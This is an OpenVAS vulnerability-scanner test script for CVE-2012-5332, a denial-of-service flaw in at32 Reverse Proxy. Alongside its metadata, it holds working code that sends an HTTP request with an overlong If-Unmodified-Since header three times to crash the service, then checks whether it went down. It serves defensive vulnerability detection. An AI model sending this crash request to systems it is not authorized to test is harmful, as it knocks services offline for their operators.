###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_at32_reverse_proxy_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# at32 Reverse Proxy Multiple HTTP Header Fields Denial Of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902825");
  script_version("$Revision: 11374 $");
  script_cve_id("CVE-2012-5332");
  script_bugtraq_id(52553);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-03-29 12:12:12 +0530 (Thu, 29 Mar 2012)");
  script_name("at32 Reverse Proxy Multiple HTTP Header Fields Denial Of Service Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/48460");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52553");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521993");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110967/at32-dos.txt");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2012-03/0080.html");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition.");
  script_tag(name:"affected", value:"at32 Reverse Proxy version 1.060.310");
  script_tag(name:"insight", value:"The flaw is due to a NULL pointer dereference error when
  processing web requests and can be exploited to cause a crash via an overly
  long string within a HTTP header.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running at32 Reverse Proxy and is prone to denial of
  service vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

res = http_get_cache(item:"/", port:port);

if(res && "reverse proxy" >< tolower(res))
{
  req = string("GET / HTTP/1.0\r\n",
               "If-Unmodified-Since: ", crap(10000), "\r\n",
               "Connection: Keep-Alive\r\n\r\n");

  ## Send crafted request
  for(i=0; i<3; i++){
    res = http_keepalive_send_recv(port:port, data:req);
  }
  sleep(3);

  if(http_is_dead(port:port)){
    security_message(port);
    exit(0);
  }
}

exit(99);